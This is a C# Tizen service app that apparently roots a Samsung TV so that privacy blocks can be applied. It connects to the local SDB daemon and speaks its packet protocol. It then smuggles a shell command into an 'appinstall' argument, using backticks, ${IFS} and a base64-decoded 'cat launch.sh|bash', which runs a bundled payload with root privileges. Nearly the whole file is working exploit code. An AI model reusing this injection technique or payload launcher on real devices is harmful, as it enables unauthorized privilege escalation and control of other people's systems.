// Localhost SDB bootstrap adapted from chris-ritsen/samsung-tv-root boot-agent (Unlicense).
// Headless, bounded, one attempt sequence per app start; no input or screen capture.
using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Tizen.Applications;

sealed class BootPrivacy : ServiceApplication
{
 const string Resources="/opt/usr/apps/com.samsung.tv.ghservice/res/quiet-privacy";
 const string Work="/tmp/quiet-privacy-client";
 const string Stage="/home/owner/share/tmp/sdk_tools/archive-root-00b0000000000021";
 const string Demand="/home/owner/share/tmp/sdk_tools/on-demand";
 const string Package="archive-root-00b0000000000021";
 protected override void OnCreate(){base.OnCreate();Task.Run(()=>{try{Bootstrap();}catch(Exception e){Note("failed:"+e.GetType().Name+":"+e.Message);}finally{Exit();}});}
 static void Note(string value){try{File.AppendAllText(Work+"/status.txt",DateTime.UtcNow.ToString("o")+" "+value+"\n");}catch{}}
 static void Bootstrap(){
  Directory.CreateDirectory(Work);Note("started");
  string host="127.0.0.1";int port=26101;
  if(File.Exists(Resources+"/test-endpoint")){string[] cfg=File.ReadAllLines(Resources+"/test-endpoint");host=cfg[0];port=int.Parse(cfg[1]);Note("test endpoint; delayed 45 seconds for installer cleanup");Thread.Sleep(45000);}
  if(File.Exists("/opt/usr/share/quiet-tizen-privacy/disabled")){Note("disabled");return;}
  foreach(string n in new[]{"SamsungTvArchiveRoot.dll","SamsungTvArchiveRoot.runtimeconfig.json","public.pem","passwd",Package+".tar.gz",Package+".tar.gz.signature"})File.Copy(Resources+"/"+n,Work+"/"+n,true);
  string outer="set -eu\nmkdir -p "+Stage+" "+Demand+"\n"+
   "cp "+Work+"/SamsungTvArchiveRoot.dll "+Work+"/SamsungTvArchiveRoot.runtimeconfig.json "+Work+"/public.pem "+Work+"/passwd "+Stage+"/\n"+
   "cp "+Work+"/"+Package+".tar.gz "+Work+"/"+Package+".tar.gz.signature "+Demand+"/\n"+
   "/usr/bin/dotnet "+Stage+"/SamsungTvArchiveRoot.dll "+Package+" "+Stage+" "+Demand+" > /tmp/quiet-privacy-payload.log 2>&1\n";
  File.WriteAllText(Work+"/launch.sh",outer,new UTF8Encoding(false));
  var limit=DateTime.UtcNow.AddMinutes(3);
  while(DateTime.UtcNow<limit){
   try{using(var s=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp)){
    s.ReceiveTimeout=2500;s.SendTimeout=2500;s.Connect(host,port);
    Send(s,Frame("CNXN",0x100000,262144,Encoding.ASCII.GetBytes("host::\0")));
    Read(s);Note("localhost handshake accepted");
    Send(s,Frame("OPEN",16,0,Encoding.ASCII.GetBytes("capability:\0")));
    var c=Read(s);if(c.Command=="OKAY")Send(s,Frame("OKAY",16,c.A,new byte[0]));
    string encoded=Convert.ToBase64String(Encoding.ASCII.GetBytes("cat "+Work+"/launch.sh|bash"));
    string argument="0 appinstall tpk qp.tpk`printf${IFS}%s${IFS}"+encoded+"|base64${IFS}-d|bash`.tpk";
    if(argument.Length>510)throw new InvalidOperationException("injection length");
    Send(s,Frame("OPEN",18,0,Encoding.ASCII.GetBytes("shell:"+argument+"\0")));
    var end=DateTime.UtcNow.AddSeconds(25);
    while(DateTime.UtcNow<end){try{c=Read(s);if(c.Command=="WRTE"||c.Command=="OKAY")Send(s,Frame("OKAY",18,c.A,new byte[0]));if(c.Command=="CLSE")break;}catch(SocketException){continue;}}
    Note(File.Exists("/tmp/quiet-privacy-applied")?"root blocks applied":"submitted; inspect root proof and units");return;
   }}catch(Exception e){Note("waiting:"+e.GetType().Name);Thread.Sleep(5000);}
  }
  Note("timed out; no further retries this start");
 }
 internal sealed class Packet{public string Command;public uint A,B;public byte[] Data;}
 static void Send(Socket s,byte[] b){int n=0;while(n<b.Length){int k=s.Send(b,n,b.Length-n,SocketFlags.None);if(k<=0)throw new IOException("send closed");n+=k;}}
 static byte[] Exact(Socket s,int count){byte[] b=new byte[count];int n=0;while(n<count){int k=s.Receive(b,n,count-n,SocketFlags.None);if(k<=0)throw new IOException("receive closed");n+=k;}return b;}
 static Packet Read(Socket s){byte[] h=Exact(s,24);int len=checked((int)BitConverter.ToUInt32(h,12));if(len<0||len>262144)throw new IOException("frame length");return new Packet{Command=Encoding.ASCII.GetString(h,0,4),A=BitConverter.ToUInt32(h,4),B=BitConverter.ToUInt32(h,8),Data=Exact(s,len)};}
 static byte[] Frame(string c,uint a,uint b,byte[] data){byte[] r=new byte[24+data.Length];byte[] cb=Encoding.ASCII.GetBytes(c);uint sum=0;foreach(byte v in data)sum+=v;Array.Copy(cb,r,4);Array.Copy(BitConverter.GetBytes(a),0,r,4,4);Array.Copy(BitConverter.GetBytes(b),0,r,8,4);Array.Copy(BitConverter.GetBytes((uint)data.Length),0,r,12,4);Array.Copy(BitConverter.GetBytes(sum),0,r,16,4);Array.Copy(BitConverter.GetBytes(~BitConverter.ToUInt32(cb,0)),0,r,20,4);Array.Copy(data,0,r,24,data.Length);return r;}
 public static void Main(string[] args){new BootPrivacy().Run(args);}
}
